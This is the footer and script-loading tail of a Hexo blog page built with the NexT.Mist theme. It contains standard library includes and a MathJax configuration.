  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yiyang Peng</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->



  


  




	





  





  






  





  

  

  

  

  

  

</body>
</html>
